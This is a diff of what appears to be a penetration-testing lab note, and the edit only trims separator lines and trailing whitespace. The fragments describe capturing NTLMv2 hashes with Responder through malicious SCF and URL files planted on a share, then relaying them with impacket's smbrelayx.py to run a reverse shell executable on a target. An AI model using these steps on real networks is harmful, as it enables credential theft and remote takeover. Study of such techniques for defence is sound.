@@ -44,9 +44,9 @@ Command=ToggleDesktop
 NOTE: IP of my KALI '192.168.1.45'.
 
 
-===================================================================================================================
+==================================================================================================================
 Step 3. Start RESPONDER and wait for a user to browse the file share hosting the malicious SCF & URL files
-===================================================================================================================
+==================================================================================================================
 
 When a user browses the file share (i.e. shared folder hosting the malicious SCF & URL files) we can capture his NTLMv2 password hash
 with the tool Responder.
@@ -250,7 +250,7 @@ Commands:
 Examples:
 ---------
 
-(kali@kali)-[/usr/share/doc/python3-impacket/examples] $ sudo python3 ./smbrelayx.py -h 192.168.1.50 -e ./reverseshell.exe                                                                                                                                                                                                                                                                                            1 â¨¯
+(kali@kali)-[/usr/share/doc/python3-impacket/examples] $ sudo python3 ./smbrelayx.py -h 192.168.1.50 -e ./reverseshell.exe
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 
 [*] Running in relay mode
